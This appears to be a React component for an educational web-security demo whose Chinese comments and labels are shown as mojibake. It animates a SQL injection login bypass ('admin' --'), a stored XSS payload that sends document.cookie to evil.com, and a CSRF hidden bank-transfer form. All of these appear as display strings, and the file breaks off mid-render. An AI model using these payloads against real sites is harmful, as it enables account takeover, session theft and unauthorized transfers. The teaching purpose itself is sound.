'use client';

import React, { useState, useRef, useEffect } from 'react';
import { Button } from "@/components/ui/button";

/**
 * æ¼æ´ç±»å‹å®šä¹‰
 * sql-injection: SQLæ³¨å…¥æ”»å‡»
 * xss: è·¨ç«™è„šæœ¬æ”»å‡»
 * csrf: è·¨ç«™è¯·æ±‚ä¼ªé€ 
 */
type VulnerabilityType = 'sql-injection' | 'xss' | 'csrf' | null;

/**
 * VulnerabilityDemoç»„ä»¶
 * 
 * è¯¥ç»„ä»¶ç”¨äºå¯è§†åŒ–å±•ç¤ºå¸¸è§çš„Webå®‰å…¨æ¼æ´æ”»å‡»è¿‡ç¨‹ï¼ŒåŒ…æ‹¬ï¼š
 * 1. SQLæ³¨å…¥æ”»å‡»ï¼šå±•ç¤ºæ”»å‡»è€…å¦‚ä½•é€šè¿‡æ“æ§SQLæŸ¥è¯¢ç»•è¿‡ç™»å½•éªŒè¯
 * 2. XSSæ”»å‡»ï¼šå±•ç¤ºæ”»å‡»è€…å¦‚ä½•æ’å…¥æ¶æ„JavaScriptä»£ç çªƒå–ç”¨æˆ·Cookie
 * 3. CSRFæ”»å‡»ï¼šå±•ç¤ºæ”»å‡»è€…å¦‚ä½•åˆ©ç”¨ç”¨æˆ·çš„æœ‰æ•ˆä¼šè¯æ‰§è¡Œæœªæˆæƒæ“ä½œ
 * 
 * ç»„ä»¶æä¾›äº¤äº’å¼æ§åˆ¶é¢æ¿ï¼Œå¯ä»¥é€‰æ‹©æ¼æ´ç±»å‹ã€æ’­æ”¾/æš‚åœåŠ¨ç”»ã€è°ƒæ•´æ’­æ”¾é€Ÿåº¦ç­‰
 * 
 * @author Chryssolion Chen
 * @version 1.0.0
 */
const VulnerabilityDemo = () => {
  // çŠ¶æ€ç®¡ç†
  const [activeVulnerability, setActiveVulnerability] = useState<VulnerabilityType>(null); // å½“å‰é€‰ä¸­çš„æ¼æ´ç±»å‹
  const [animationStep, setAnimationStep] = useState(0); // å½“å‰åŠ¨ç”»æ­¥éª¤
  const [isPlaying, setIsPlaying] = useState(false); // æ˜¯å¦æ­£åœ¨æ’­æ”¾åŠ¨ç”»
  const [speed, setSpeed] = useState(1); // åŠ¨ç”»æ’­æ”¾é€Ÿåº¦ï¼š1 = æ­£å¸¸é€Ÿåº¦ï¼Œ2 = å¿«é€Ÿï¼Œ0.5 = æ…¢é€Ÿ
  
  // å¼•ç”¨ç®¡ç†
  const terminalRef = useRef<HTMLDivElement>(null); // ç»ˆç«¯è¾“å‡ºåŒºåŸŸçš„å¼•ç”¨
  const animationRef = useRef<NodeJS.Timeout | null>(null); // åŠ¨ç”»å®šæ—¶å™¨çš„å¼•ç”¨
  
  /**
   * æ¸…ç†åŠ¨ç”»å®šæ—¶å™¨ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼
   */
  const clearAnimationTimer = () => {
    if (animationRef.current) {
      clearTimeout(animationRef.current);
      animationRef.current = null;
    }
  };
  
  /**
   * é‡ç½®åŠ¨ç”»çŠ¶æ€
   * æ¸…ç†å®šæ—¶å™¨å¹¶å°†åŠ¨ç”»æ­¥éª¤é‡ç½®ä¸º0
   */
  const resetAnimation = () => {
    clearAnimationTimer();
    setAnimationStep(0);
    setIsPlaying(false);
  };
  
  /**
   * åˆ‡æ¢æ¼æ´ç±»å‹
   * @param type è¦åˆ‡æ¢åˆ°çš„æ¼æ´ç±»å‹
   */
  const switchVulnerability = (type: VulnerabilityType) => {
    resetAnimation();
    setActiveVulnerability(type);
  };
  
  /**
   * æ’­æ”¾/æš‚åœåŠ¨ç”»
   * åˆ‡æ¢isPlayingçŠ¶æ€
   */
  const togglePlayPause = () => {
    setIsPlaying(!isPlaying);
  };
  
  /**
   * è°ƒæ•´åŠ¨ç”»æ’­æ”¾é€Ÿåº¦
   * å¾ªç¯åˆ‡æ¢é€Ÿåº¦: 0.5 (æ…¢) -> 1 (æ­£å¸¸) -> 2 (å¿«) -> 0.5 (æ…¢)...
   */
  const changeSpeed = () => {
    setSpeed(prev => prev === 0.5 ? 1 : prev === 1 ? 2 : 0.5);
  };
  
  // ===== æ¼æ´åŠ¨ç”»æ­¥éª¤å®šä¹‰ =====
  
  /**
   * SQLæ³¨å…¥æ”»å‡»çš„åŠ¨ç”»æ­¥éª¤
   * æ¯ä¸ªæ­¥éª¤åŒ…å«ç»ˆç«¯æ˜¾ç¤ºæ–‡æœ¬å’Œå¯¹åº”çš„è§†è§‰æ•ˆæœç±»å‹
   */
  const sqlInjectionSteps = [
    { terminal: '-- æ”»å‡»è€…è¾“å…¥æ¶æ„SQLæŸ¥è¯¢', visual: 'hacker-typing' },
    /**
     * æ”»å‡»è€…åœ¨ç™»å½•è¡¨å•ä¸­è¾“å…¥æ¶æ„ç”¨æˆ·åï¼Œä½¿ç”¨SQLæ³¨é‡Šç»•è¿‡å¯†ç éªŒè¯
     * æ­¤æ­¥éª¤å±•ç¤ºäº†SQLæ³¨å…¥æ”»å‡»ä¸­æ”»å‡»è€…å¦‚ä½•é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¾“å…¥æ¥æ“æ§SQLæŸ¥è¯¢
     * terminal: ç»ˆç«¯æ˜¾ç¤ºçš„æ–‡æœ¬å†…å®¹ï¼Œå³æ”»å‡»è€…è¾“å…¥çš„æ¶æ„ç”¨æˆ·å
     * visual: å¯¹åº”çš„è§†è§‰æ•ˆæœç±»å‹ï¼Œè¿™é‡Œè¡¨ç¤ºè¡¨å•è¾“å…¥é˜¶æ®µ
     */
    { terminal: "ç”¨æˆ·å: admin' --", visual: 'form-input' },
    { terminal: "æ„å»ºSQLæŸ¥è¯¢: SELECT * FROM users WHERE username='admin' --' AND password='ä»»æ„å¯†ç '", visual: 'query-building' },
    { terminal: "-- æ³¨é‡Šæ‰äº†å¯†ç æ£€æŸ¥éƒ¨åˆ†", visual: 'query-highlight' },
    { terminal: "æ‰§è¡ŒæŸ¥è¯¢...", visual: 'server-processing' },
    { terminal: "æŸ¥è¯¢æˆåŠŸ! è·å–ç®¡ç†å‘˜æƒé™", visual: 'access-granted' },
    { terminal: "-- æ”»å‡»æˆåŠŸ: æ— éœ€å¯†ç ç™»å½•ä¸ºç®¡ç†å‘˜", visual: 'hacker-success' }
  ];
  
  /**
   * XSSæ”»å‡»çš„åŠ¨ç”»æ­¥éª¤
   * å±•ç¤ºæ”»å‡»è€…å¦‚ä½•é€šè¿‡æ’å…¥æ¶æ„è„šæœ¬çªƒå–ç”¨æˆ·Cookie
   */
  const xssSteps = [
    { terminal: '-- æ”»å‡»è€…å‡†å¤‡æ¶æ„JavaScriptä»£ç ', visual: 'hacker-typing' },
    { terminal: 'åœ¨è¯„è®ºæ¡†ä¸­è¾“å…¥: <script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>', visual: 'comment-input' },
    { terminal: 'ç½‘ç«™æœªè¿‡æ»¤HTMLæ ‡ç­¾ï¼Œä¿å­˜æ¶æ„è¯„è®º...', visual: 'server-storing' },
    { terminal: 'å…¶ä»–ç”¨æˆ·è®¿é—®åŒ…å«æ¶æ„è¯„è®ºçš„é¡µé¢', visual: 'user-browsing' },
    { terminal: 'æµè§ˆå™¨æ‰§è¡Œéšè—çš„JavaScriptä»£ç ', visual: 'script-execution' },
    { terminal: 'ç”¨æˆ·Cookieæ­£åœ¨è¢«å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨...', visual: 'data-transfer' },
    { terminal: '-- æ”»å‡»æˆåŠŸ: çªƒå–äº†ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯', visual: 'hacker-success' }
  ];
  
  /**
   * CSRFæ”»å‡»çš„åŠ¨ç”»æ­¥éª¤
   * å±•ç¤ºæ”»å‡»è€…å¦‚ä½•è¯±å¯¼ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œæœªæˆæƒçš„æ“ä½œ
   */
  const csrfSteps = [
    { terminal: '-- æ”»å‡»è€…åˆ›å»ºæ¶æ„ç½‘ç«™', visual: 'hacker-typing' },
    { terminal: 'åµŒå…¥éšè—çš„è¡¨å•: <form action="https://bank.com/transfer" method="POST">', visual: 'hidden-form' },
    { terminal: '<input type="hidden" name="to" value="hacker" />', visual: 'form-fields' },
    { terminal: '<input type="hidden" name="amount" value="1000" />', visual: 'form-fields' },
    { terminal: 'ç”¨æˆ·å·²ç™»å½•é“¶è¡Œç½‘ç«™(å…·æœ‰æœ‰æ•ˆçš„Cookie)', visual: 'user-authenticated' },
    { terminal: 'ç”¨æˆ·è®¿é—®äº†æ”»å‡»è€…çš„æ¶æ„ç½‘ç«™', visual: 'user-browsing' },
    { terminal: 'è¡¨å•è‡ªåŠ¨æäº¤ï¼Œå‘èµ·è½¬è´¦è¯·æ±‚', visual: 'request-sent' },
    { terminal: 'é“¶è¡Œç½‘ç«™æ¥æ”¶è¯·æ±‚(å¸¦æœ‰ç”¨æˆ·æœ‰æ•ˆCookie)', visual: 'server-processing' },
    { terminal: '-- æ”»å‡»æˆåŠŸ: å®Œæˆäº†æœªæˆæƒçš„è½¬è´¦', visual: 'hacker-success' }
  ];
  
  /**
   * è·å–å½“å‰é€‰ä¸­æ¼æ´ç±»å‹çš„åŠ¨ç”»æ­¥éª¤æ•°æ®
   * @returns å½“å‰æ¼æ´ç±»å‹çš„æ­¥éª¤æ•°ç»„
   */
  const getCurrentSteps = () => {
    switch (activeVulnerability) {
      case 'sql-injection': return sqlInjectionSteps;
      case 'xss': return xssSteps;
      case 'csrf': return csrfSteps;
      default: return [];
    }
  };
  
  // ===== å‰¯ä½œç”¨å¤„ç† =====
  
  /**
   * åŠ¨ç”»é€»è¾‘æ•ˆæœ
   * æ ¹æ®isPlayingçŠ¶æ€å’ŒåŠ¨ç”»æ­¥éª¤æ§åˆ¶åŠ¨ç”»è¿›åº¦
   */
  useEffect(() => {
    const steps = getCurrentSteps();
    
    if (isPlaying && animationStep < steps.length) {
      // æ ¹æ®é€Ÿåº¦è°ƒæ•´åŠ¨ç”»é—´éš”
      const delay = 2000 / speed; // åŸºç¡€å»¶è¿Ÿ2ç§’
      
      // è®¾ç½®å®šæ—¶å™¨ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªåŠ¨ç”»æ­¥éª¤
      animationRef.current = setTimeout(() => {
        setAnimationStep(prev => prev + 1);
      }, delay);
    } else if (animationStep >= steps.length) {
      // åŠ¨ç”»æ’­æ”¾å®Œæ¯•ï¼Œåœæ­¢æ’­æ”¾
      setIsPlaying(false);
    }
    
    // ç»„ä»¶å¸è½½æ—¶æ¸…ç†å®šæ—¶å™¨ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼
    return () => clearAnimationTimer();
  }, [isPlaying, animationStep, activeVulnerability, speed]);
  
  /**
   * è‡ªåŠ¨æ»šåŠ¨ç»ˆç«¯åˆ°åº•éƒ¨ï¼Œç¡®ä¿æœ€æ–°è¾“å‡ºå†…å®¹å¯è§
   */
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [animationStep]);
  
  // ===== æ¸²æŸ“è¾…åŠ©å‡½æ•° =====
  
  /**
   * æ¸²æŸ“ç»ˆç«¯è¾“å‡ºå†…å®¹
   * æ˜¾ç¤ºæˆªè‡³å½“å‰æ­¥éª¤çš„æ‰€æœ‰ç»ˆç«¯è¾“å‡º
   * @returns JSXå…ƒç´ æ•°ç»„
   */
  const renderTerminalOutput = () => {
    const steps = getCurrentSteps();
    return steps.slice(0, animationStep + 1).map((step, index) => (
      <div key={index} className="terminal-line">
        <span className={step.visual === 'hacker-success' ? 'text-green-400' : 'text-green-300'}>
          {step.terminal}
        </span>
      </div>
    ));
  };
  
  /**
   * æ¸²æŸ“å¯è§†åŒ–åŠ¨ç”»å†…å®¹
   * æ ¹æ®å½“å‰æ­¥éª¤å’Œè§†è§‰æ•ˆæœç±»å‹è¿”å›å¯¹åº”çš„åŠ¨ç”»ç»„ä»¶
   * @returns JSXå…ƒç´ 
   */
  const renderVisualAnimation = () => {
    // å¦‚æœæ²¡æœ‰é€‰æ‹©æ¼æ´ç±»å‹æˆ–åŠ¨ç”»å·²æ’­æ”¾å®Œæ¯•ï¼Œè¿”å›ç©º
    if (!activeVulnerability || animationStep >= getCurrentSteps().length) {
      return null;
    }
    
    // è·å–å½“å‰æ­¥éª¤çš„ä¿¡æ¯
    const currentStep = getCurrentSteps()[animationStep];
    const visual = currentStep.visual;
    
    // æ ¹æ®ä¸åŒçš„è§†è§‰æ•ˆæœç±»å‹è¿”å›ä¸åŒçš„åŠ¨ç”»ç»„ä»¶
    switch (visual) {
      // æ”»å‡»è€…è¾“å…¥é˜¶æ®µ
      case 'hacker-typing':
        return (
          <div className="flex items-center justify-center h-full">
            <div className="text-xl animate-pulse text-red-500">ğŸ‘¨â€ğŸ’» æ”»å‡»è€…æ­£åœ¨è¾“å…¥...</div>
          </div>
        );
      
      // è¡¨å•è¾“å…¥é˜¶æ®µ(SQLæ³¨å…¥æˆ–XSS)
      /**
       * å¤„ç†è¡¨å•è¾“å…¥é˜¶æ®µçš„è§†è§‰æ•ˆæœ
       * å½“åŠ¨ç”»æ­¥éª¤ä¸º 'form-input' æˆ– 'comment-input' æ—¶ï¼Œæ¸²æŸ“ç›¸åº”çš„è¡¨å•è¾“å…¥ç•Œé¢
       * ç”¨äºå±•ç¤º SQL æ³¨å…¥æ”»å‡»çš„ç™»å½•è¡¨å•è¾“å…¥æˆ– XSS æ”»å‡»çš„è¯„è®ºè¡¨å•è¾“å…¥
       */
      case 'form-input':
      case 'comment-input':
        return (
          // è¡¨å•å®¹å™¨ï¼Œè®¾ç½®èƒŒæ™¯é¢œè‰²ã€åœ†è§’ã€å†…è¾¹è·ã€é˜´å½±å’Œæœ€å¤§å®½åº¦ï¼Œå¹¶å±…ä¸­æ˜¾ç¤º
          <div className="bg-red dark:bg-gray-800 rounded p-4 shadow-lg max-w-md mx-auto">
            {/* è¡¨å•æ ‡é¢˜ï¼Œæ ¹æ®ä¸åŒçš„æ¼æ´ç±»å‹æ˜¾ç¤ºä¸åŒçš„æ ‡é¢˜ */}
            <div className="mb-2 text-sm font-bold">{activeVulnerability === 'sql-injection' ? 'ç™»å½•è¡¨å•' : 'è¯„è®ºè¡¨å•'}</div>
            {/* è¡¨å•è¾“å…¥åŒºåŸŸï¼Œæ ¹æ®ä¸åŒçš„æ¼æ´ç±»å‹è®¾ç½®ä¸åŒçš„è¾¹æ¡†é¢œè‰²å’ŒèƒŒæ™¯é¢œè‰² */}
            <div className={`p-2 border rounded ${activeVulnerability === 'sql-injection' ? 'border-red-500 bg-red-100 dark:bg-red-900/30' : 'border-yellow-500 bg-yellow-100 dark:bg-yellow-900/30'}`}>
              {/* æ˜¾ç¤ºæ”»å‡»è€…è¾“å…¥çš„æ¶æ„å†…å®¹ï¼Œæ ¹æ®ä¸åŒçš„æ¼æ´ç±»å‹æ˜¾ç¤ºä¸åŒçš„å†…å®¹ */}
              {activeVulnerability === 'sql-injection' ? "admin' --" : "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"}
            </div>
          </div>
        );
      
      // SQLæŸ¥è¯¢æ„å»ºå’Œé«˜äº®é˜¶æ®µ
      /**
       * å¤„ç†SQLæŸ¥è¯¢æ„å»ºå’Œé«˜äº®é˜¶æ®µçš„è§†è§‰æ•ˆæœ
       * å±•ç¤ºæ”»å‡»è€…æ„é€ çš„æ¶æ„SQLæŸ¥è¯¢ï¼Œåœ¨æŸ¥è¯¢é«˜äº®é˜¶æ®µä¼šå¯¹å¯†ç æ£€æŸ¥éƒ¨åˆ†è¿›è¡Œå¼±åŒ–æ˜¾ç¤º
       */
      case 'query-building':
      case 'query-highlight':
        return (
          // å®¹å™¨ï¼Œè®¾ç½®èƒŒæ™¯é¢œè‰²ã€åœ†è§’ã€å†…è¾¹è·ã€å­—ä½“æ ·å¼ã€æ–‡æœ¬å¤§å°ã€æ–‡æœ¬é¢œè‰²å’Œæº¢å‡ºå¤„ç†
          <div className="bg-gray-900 rounded-md p-3 font-mono text-sm text-white overflow-x-auto">
            {/* æ˜¾ç¤ºSQLæŸ¥è¯¢çš„å›ºå®šéƒ¨åˆ† */}
            <span>SELECT * FROM users WHERE username=</span>
            {/* æ˜¾ç¤ºæ”»å‡»è€…è¾“å…¥çš„æ¶æ„ç”¨æˆ·åéƒ¨åˆ†ï¼Œä½¿ç”¨çº¢è‰²çªå‡ºæ˜¾ç¤º */}
            <span className="text-red-400">'admin' --'</span>
            {/* æ ¹æ®è§†è§‰æ•ˆæœç±»å‹ï¼Œå¯¹å¯†ç æ£€æŸ¥éƒ¨åˆ†è¿›è¡Œå¤„ç†ï¼Œé«˜äº®æ—¶æ·»åŠ é€æ˜åº¦å’Œåˆ é™¤çº¿ */}
            <span className={visual === 'query-highlight' ? 'opacity-50 line-through' : ''}>
              AND password='ä»»æ„å¯†ç '
            </span>
          </div>
        );
      
      /**
       * å¤„ç†æœåŠ¡å™¨å¤„ç†å’Œå­˜å‚¨é˜¶æ®µçš„è§†è§‰æ•ˆæœ
       * æ˜¾ç¤ºä¸€ä¸ªæ—‹è½¬çš„åŠ è½½å›¾æ ‡å’Œç›¸åº”çš„æç¤ºä¿¡æ¯
       */
      case 'server-processing':
      case 'server-storing':
        return (
          // å®¹å™¨ï¼Œè®¾ç½®ä¸ºå¼¹æ€§å¸ƒå±€ï¼Œå‚ç›´å’Œæ°´å¹³å±…ä¸­å¯¹é½
          <div className="flex flex-col items-center justify-center">
            <div className="w-16 h-16 border-4 border-t-blue-500 border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin mb-2"></div>
            <div className="text-sm">{activeVulnerability === 'sql-injection' ? 'æ•°æ®åº“å¤„ç†æŸ¥è¯¢...' : 'æœåŠ¡å™¨å­˜å‚¨æ•°æ®...'}</div>
          </div>
        );
      
      // æ”»å‡»æˆåŠŸé˜¶æ®µ
      case 'access-granted':
      case 'hacker-success':
        return (
          <div className="bg-green-100 dark:bg-green-900/30 border border-green-500 rounded-md p-4 text-center">
            <div className="text-green-600 dark:text-green-400 text-lg font-bold mb-1">æ”»å‡»æˆåŠŸ!</div>
            <div className="text-sm">
              {activeVulnerability === 'sql-injection' ? 'è·å¾—ç®¡ç†å‘˜è®¿é—®æƒé™' : 
               activeVulnerability === 'xss' ? 'æˆåŠŸçªƒå–ç”¨æˆ·Cookie' : 
               'å®Œæˆæœªæˆæƒçš„èµ„é‡‘è½¬è´¦'}
            </div>
          </div>
        );
      
      // ç”¨æˆ·æµè§ˆç½‘é¡µé˜¶æ®µ
      case 'user-browsing':
        return (
          <div className="bg-blue-100 dark:bg-blue-900/30 border border-blue-500 rounded-md p-4">
            <div className="text-center mb-2">ğŸ‘¤ æ™®é€šç”¨æˆ·æµè§ˆç½‘é¡µ</div>
            <div className="bg-red dark:bg-gray-800 p-2 rounded border border-gray-300 dark:border-gray-600 text-xs">
              {activeVulnerability === 'xss' ? 
                <div>
                  <div className="mb-1">è¯„è®ºåŒº:</div>
                  <div className="p-1 mb-1">å¾ˆæ£’çš„æ–‡ç« !</div>
                  <div className="p-1 bg-red-100 dark:bg-red-900/30 border border-red-500 rounded">
                    <span className="opacity-70">&lt;script&gt;(éšè—çš„æ¶æ„ä»£ç )&lt;/script&gt;</span>
                  </div>
                </div> :
                <div>
                  <div className="mb-1">ç²¾ç¾ç½‘ç«™:</div>
                  <div className="p-1">ç‚¹å‡»æŸ¥çœ‹æœ‰è¶£å†…å®¹</div>
                  <div className="p-1 bg-red-100 dark:bg-red-900/30 border border-red-500 rounded">
                    <span className="opacity-70">(éšè—çš„æ¶æ„è¡¨å•)</span>
                  </div>
                </div>
              }
            </div>
          </div>
        );
      
      // JavaScriptè„šæœ¬æ‰§è¡Œé˜¶æ®µ(XSS)
      case 'script-execution':
        return (
          <div className="flex flex-col items-center">
            <div className="mb-2">JavaScript æ­£åœ¨æ‰§è¡Œ...</div>
            <div className="bg-yellow-100 dark:bg-yellow-900/30 p-2 rounded-md border border-yellow-500 mb-2 font-mono text-xs overflow-x-auto w-full max-w-xs">
              <div className="animate-pulse">document.cookie</div>
              <div className="text-gray-600 dark:text-gray-400">â¤· "session=123abc; auth=xyz789"</div>
            </div>
            <div className="animate-bounce text-red-500">â†“ æ•°æ®å¤–æ³„ä¸­</div>
          </div>
        );
      
      // æ•°æ®ä¼ è¾“é˜¶æ®µ(XSS)
      case 'data-transfer':
        return (
          <div className="relative mx-auto w-full max-w-md h-20">
            <div className="absolute left-0 top-5 bg-blue-500 dark:bg-blue-600 rounded-md px-3 py-1 text-white text-xs">
              ç”¨æˆ·æµè§ˆå™¨
            </div>
            <div className="absolute right-0 top-5 bg-red-500 dark:bg-red-600 rounded-md px-3 py-1 text-white text-xs">
              æ”»å‡»è€…æœåŠ¡å™¨
            </div>
            <div className="absolute left-20 top-7 h-0.5 bg-red-400 right-20 animate-[width_1.5s_ease-in-out_infinite]">
              <div className="absolute right-0 top-[-3px] w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
            </div>
            <div className="absolute left-1/2 transform -translate-x-1/2 top-10 text-xs text-red-500">
              Cookieæ•°æ®ä¼ è¾“ä¸­...
            </div>
          </div>
        );
      
      // CSRFæ”»å‡»çš„è¡¨å•ä»£ç å±•ç¤º
      case 'hidden-form':
      case 'form-fields':
        return (
          <div className="bg-gray-900 rounded-md p-3 font-mono text-sm text-white overflow-x-auto">
            <div className="text-blue-400">&lt;form</div>
            <div className="pl-4">action=<span className="text-green-400">"https://bank.com/transfer"</span></div>
            <div className="pl-4">method=<span className="text-green-400">"POST"</span></div>
            <div className="text-blue-400">&gt;</div>
            {visual === 'form-fields' && (
              <>
                <div className="pl-2 text-blue-400">&lt;input</div>
                <div className="pl-6">type=<span className="text-green-400">"hidden"</span></div>
                <div className="pl-6">name=<span className="text-green-400">"to"</span></div>
                <div className="pl-6">value=<span className="text-red-400">"hacker"</span></div>
                <div className="pl-2 text-blue-400">/&gt;</div>
                <div className="pl-2 text-blue-400">&lt;input</div>
                <div className="pl-6">type=<span className="text-green-400">"hidden"</span></div>
                <div className="pl-6">name=<span className="text-green-400">"amount"</span></div>
                <div className="pl-6">value=<span className="text-red-400">"1000"</span></div>
                <div className="pl-2 text-blue-400">/&gt;</div>
              </>
            )}
          </div>
        );
      
      // ç”¨æˆ·å·²è®¤è¯çŠ¶æ€å±•ç¤º(CSRF)
      case 'user-authenticated':
        return (
          <div className="bg-green-100 dark:bg-green-900/30 border border-green-500 rounded-md p-3">
            <div className="flex items-center gap-2">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
              <div className="text-sm">ç”¨æˆ·å·²ç™»å½•åˆ°é“¶è¡Œç½‘ç«™</div>
            </div>
            <div className="text-xs text-gray-600 dark:text-gray-400 mt-1">
              Cookie: session=valid-bank-session-xyz
            </div>
          </div>
        );
      
      // è¯·æ±‚å‘é€é˜¶æ®µ(CSRF)
      case 'request-sent':
        return (
          <div className="relative mx-auto w-full max-w-md h-20">
            <div className="absolute left-0 top-5 bg-blue-500 dark:bg-blue-600 rounded-md px-3 py-1 text-white text-xs">
              ç”¨æˆ·æµè§ˆå™¨
            </div>
            <div className="absolute right-0 top-5 bg-green-500 dark:bg-green-600 rounded-md px-3 py-1 text-white text-xs">
              bank.com
            </div>
            <div className="absolute left-20 top-7 h-0.5 bg-yellow-400 right-20 animate-[width_1.5s_ease-in-out_infinite]">
              <div className="absolute right-0 top-[-3px] w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
            </div>
            <div className="absolute left-1/2 transform -translate-x-1/2 top-10 text-xs text-yellow-500">
              POST /transfer {"{to:'hacker',amount:1000}"}
            </div>
          </div>
        );
      
      // é»˜è®¤æƒ…å†µè¿”å›ç©º
      default:
        return null;
    }
  };
  
  // ===== ç»„ä»¶ä¸»ä½“æ¸²æŸ“ =====
  return (
    <div className="relative bg-black rounded-lg overflow-hidden shadow-lg border border-gray-700 dark:border-blue-800">
      {/* åŠ¨æ€æ˜Ÿç©ºèƒŒæ™¯ */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="stars-container absolute inset-0">
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
          <div className="star"></div>
        </div>
        <div className="absolute inset-0 bg-gradient-to-br from-blue-900/40 via-black/60 to-purple-900/40"></div>
      </div>
      
      {/* æ ‡é¢˜æ  */}
      <div className="relative bg-gradient-to-r from-blue-900 to-purple-900 text-white px-4 py-3 z-10">
        <h3 className="text-base font-bold">å®‰å…¨æ¼æ´æ¼”ç¤º</h3>
        <p className="text-xs text-blue-100">å¯è§†åŒ–å±•ç¤ºå¸¸è§çš„Webå®‰å…¨æ¼æ´æ”»å‡»è¿‡ç¨‹</p>
      </div>
      
      {/* æ¼æ´é€‰æ‹©æŒ‰é’®ç»„ */}
      <div className="relative p-3 flex gap-2 overflow-x-auto bg-gray-900/80 backdrop-blur-sm z-10">
        <Button
          variant={activeVulnerability === 'sql-injection' ? 'destructive' : 'outline'}
          size="sm"
          onClick={() => switchVulnerability('sql-injection')}
          className={`text-xs ${activeVulnerability === 'sql-injection' ? '' : 'border-red-500 text-red-400 hover:text-red-500 hover:bg-red-950/30'}`}
        >
          SQLæ³¨å…¥
        </Button>
        <Button
          variant={activeVulnerability === 'xss' ? 'default' : 'outline'}
          size="sm"
          onClick={() => switchVulnerability('xss')}
          className={`text-xs ${activeVulnerability === 'xss' ? 'bg-amber-600 hover:bg-amber-700' : 'border-amber-500 text-amber-400 hover:text-amber-500 hover:bg-amber-950/30'}`}
        >
          XSSæ”»å‡»
        </Button>
        <Button
          variant={activeVulnerability === 'csrf' ? 'default' : 'outline'}
          size="sm"
          onClick={() => switchVulnerability('csrf')}
          className={`text-xs ${activeVulnerability === 'csrf' ? 'bg-purple-600 hover:bg-purple-700' : 'border-purple-500 text-purple-400 hover:text-purple-500 hover:bg-purple-950/30'}`}
        >
          CSRFæ”»å‡»
        </Button>
      </div>
      
      {/* åŠ¨ç”»æ§åˆ¶åŒº - åªåœ¨é€‰æ‹©äº†æ¼æ´ç±»å‹æ—¶æ˜¾ç¤º */}
      {activeVulnerability && (
        <div className="relative p-2 flex justify-between items-center bg-gray-900/60 backdrop-blur-sm border-t border-b border-gray-700 z-10">
          <div className="flex items-center gap-2">
            {/* æ’­æ”¾/æš‚åœæŒ‰é’® */}
            <Button
              variant="outline"
              size="sm"
              onClick={togglePlayPause}
              className="text-xs border-cyan-600 text-cyan-400 hover:text-cyan-300 hover:bg-cyan-950/30"
            >
              {isPlaying ? (
                <span className="flex items-center gap-1">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 9v6m4-6v6m7-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  æš‚åœ
                </span>
              ) : (
                <span className="flex items-center gap-1">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  æ’­æ”¾
                </span>
              )}
            </Button>
            {/* é‡ç½®æŒ‰é’® */}
            <Button
              variant="outline"
              size="sm"
              onClick={resetAnimation}
              className="text-xs border-blue-600 text-blue-400 hover:text-blue-300 hover:bg-blue-950/30"
              disabled={animationStep === 0}
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
              é‡ç½®
            </Button>
          </div>
          {/* é€Ÿåº¦æ§åˆ¶æŒ‰é’® */}
          <div>
            <Button
              variant="ghost"
              size="sm"
              onClick={changeSpeed}
              className="text-xs text-teal-400 hover:text-teal-300 hover:bg-teal-950/30"
            >
              é€Ÿåº¦: {speed === 0.5 ? 'æ…¢é€Ÿ' : speed === 1 ? 'æ­£å¸¸' : 'å¿«é€Ÿ'}
            </Button>
          </div>
        </div>
      )}
      
